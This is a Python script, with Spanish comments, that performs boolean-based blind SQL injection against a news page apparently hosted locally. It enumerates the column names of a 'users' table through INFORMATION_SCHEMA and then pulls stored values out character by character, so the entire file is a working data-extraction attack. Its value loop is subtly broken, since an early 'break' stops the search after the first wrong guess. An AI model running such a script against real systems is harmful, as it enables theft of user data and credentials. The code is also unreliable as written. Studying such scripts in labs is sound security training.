import requests
import string

def condiccion_logica(condition):
    """
    Lanza una petición con una condición booleana
    y devuelve True / False según la respuesta
    """
    r = requests.get("http://localhost/news.php", params={"id": condition})

    if "NOTICIAS" in r.text:
        return True
    else:
        return False

def extrae_nombre_columnas(max_columns=10, max_len=20):
    columns = []

    for col_index in range(0, max_columns):
        name = ""
        for pos in range(1, max_len + 1):
            for c in string.ascii_lowercase:
                condition = f"""
                1 AND SUBSTRING(
                (
                    SELECT COLUMN_NAME
                    FROM INFORMATION_SCHEMA.COLUMNS
                    WHERE TABLE_SCHEMA = database()
                    AND TABLE_NAME = 'users'
                    LIMIT {col_index},1
                ),
                {pos},1
                ) = '{c}'
                """
                if condiccion_logica(condition):
                    name += c
                    break

        if name:
            columns.append(name)
            print(f"Columna encontrada: {name}")
        else:
            break

    return columns

def extrae_valor_columna(columna, max_rows=10, max_len=50):
    print(f"\nExtrae valor de columna: {columna}")

    for row in range(0, max_rows):
        value = ""
        for pos in range(1, max_len + 1):
            for c in string.printable:
                condition = f"""
                1 AND LENGTH(
                    (SELECT {columna} FROM users LIMIT {row},1)
                ) >= {pos}
                AND SUBSTRING(
                    (SELECT {columna} FROM users LIMIT {row},1),
                    {pos},1
                ) = '{c}'
                """
                
                if condiccion_logica(condition):
                    value += c
                    break
                else:
                    break

        if value:
            print(f"- {value}")
        else:
            break

if __name__ == "__main__":
    print("Columnas de users: \n")
    cols = extrae_nombre_columnas()

    for col in cols:
        extrae_valor_columna(col)
